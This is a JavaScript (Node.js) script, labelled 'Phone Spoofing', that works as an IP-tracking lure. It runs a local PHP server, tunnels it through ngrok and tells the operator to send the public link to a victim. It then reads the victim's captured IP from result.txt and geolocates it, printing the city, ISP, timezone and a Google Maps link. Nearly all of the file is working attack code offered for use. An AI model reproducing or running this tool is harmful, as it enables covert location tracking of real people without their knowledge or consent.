// Copyright© 2019 By Fajar Firdaus

import cmd from 'shelljs';
import f from 'fs';
import r from 'readline';
import c from 'colors';
import req from 'request';
import loadingModule from 'ora';
import style from 'chalk';
import notif from 'beeper';
import check from 'log-symbols';
import cow from 'cowsay';

const loading = loadingModule();

console.log(cow.say({
	text : "Hello Users :)",
	e : "o0",
	T : "V"
}));

console.log(style.bgBlack(check.warning + " [ Phone Spoofing By Fajar Firdaus ]"));
console.log(c.rainbow("[!] Version V2"));
console.log(c.rainbow("[:———————————————————:]"));
console.log(style.bgBlue("[Coder] Fajar Firdaus"));
console.log(style.bgBlue("[Fb] Fajar Firdaus"));
console.log(style.bgBlue("[IG] @kernel024"));
console.log(style.bgBlue("[Twitter] @kernel024"));
console.log(c.rainbow("[:———————————————————:]"));

async function run() {
  try {
    await cmd.exec("php -S 127.0.0.1:3200 > /dev/null 2>&1 & ");
    await cmd.exec("./ngrok http 3200 > /dev/null 2>&1 &");

    console.log(style.bgBlue("[/] Please Wait... :)"));

    const url = cmd.exec(`curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | awk -F ':"' '{print $2}'`);

    console.log(c.blue(`[ Send This Link To Victim ] > ${url}`));

    loading.text = "Listening...";
    loading.start();

    f.watchFile("result.txt", async function(current, previous) {
      const a = f.readFileSync("result.txt", "utf8");
      const ipvictim = a.substr(7, 13);

      req(`http://ip-api.com/json/${ipvictim}`, function(error, response, body) {
        if (error) {
          console.error(style.red(check.error, `Error: ${error}`));
          return;
        }

        const js = JSON.parse(body);
        console.log(c.red("\n[!] Type Ctrl + c To Exit"));
        console.log(style.cyan(`${check.success} [IP] : ${ipvictim}`));
        notif(3);
        console.log(style.green("[:–––––––––––––––––––:]"));
        console.log(style.white(`${check.warning} { City } > ${js["city"]}`));
        console.log(style.white(`${check.warning} { Country } > ${js["country"]}`));
        console.log(style.white(`${check.warning} { ISP } > ${js["as"]}`));
        console.log(style.white(`${check.warning} { Timezone } > ${js["timezone"]}`));
        console.log(style.white(`${check.warning} { Google Maps } > https://www.google.com/maps/place/${js['lat']}, ${js['lon']}`));
        console.log(style.white(`${check.warning} { IP } > ${js["query"]}`));
        console.log(style.green("[:–––––––––––––––––––:]"));
      });
    });
  } catch (error) {
    console.error(style.red(check.error, `Error: ${error}`));
  }
}

run();

